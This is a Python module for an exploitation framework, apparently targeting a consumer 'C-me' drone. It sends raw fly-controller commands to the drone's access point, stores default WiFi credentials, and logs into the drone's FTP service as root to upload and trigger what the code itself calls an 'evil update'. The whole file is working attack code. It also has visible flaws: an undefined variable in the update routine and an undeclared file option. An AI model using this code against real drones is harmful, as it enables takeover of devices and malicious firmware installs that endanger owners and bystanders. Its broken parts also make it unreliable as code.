# -*- coding: UTF-8 -*-
import socket
import time
from ftplib import FTP
from sploitkit import *


__all__ = ["CmeChangeCommand", "CmeUpdateCommand"]


class CmeCommand(Module):
    config = Config({
        Option(
            'IP',
            "IP address of drone's AP",
            True,
        ): "192.168.100.1",
        Option(
            'FLYCTL_PORT',
            "Fly controller port",
            True,
        ): 4646,
    })
    path = "exploits/cme"
    
    def send_command(self, number, param):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.config.get("IP"), self.config.get("FLYCTL_PORT")))
        s.send(b'{"CMD" : %d, "PARAM" : %s}' % (number, str(param)))
        success = s.recv(1024).strip() == b"0"
        if not success:
            self.logger.failure("Command failed")
        return success


class CmeChangeCommand(CmeCommand):
    config = Config({
        Option(
            'PASSWORD',
            "current WiFi password",
            True,
        ): "12345678",
        Option(
            'SSID',
            "drone's SSID",
            True,
        ): "C-me_8a9dd5",
    })
    
    
class CmeUpdateCommand(CmeCommand):
    config = Config({
        Option(
            'FTP_PORT',
            "FTP service port",
            True,
        ): 2121,
    })

    def send_update(self, filename=None):
        self.logger.info("Starting an FTP session...")
        ftp = FTP(self.config.get("IP"), self.config.get("FTP_PORT"))
        self.logger.debug("Authenticating...")
        ftp.sendcmd("USER root")
        ftp.sendcmd("PASS *")
        ftp.sendcmd("SYST")
        ftp.sendcmd("PWD")
        ftp.sendcmd("TYPE I")
        ftp.sendcmd("CWD /")
        ftp.sendcmd("PASV")
        self.logger.info("Pushing an evil update...")
        with open(self.config.get("UPDATE_FILE"), 'rb') as f:
            ftp.storbinary("STOR 0.7.15.zip", f)
        ftp.quit()
        self.logger.info("Triggering update...")
        success = s.send_command(71, '"0.7.15"')
        if success:
            delay = 10
            self.logger.info("Waiting {} seconds...".format(delay))
            time.sleep(delay)
            self.logger.success("Target updated")
            self.logger.info("Please restart the drone")
        return success
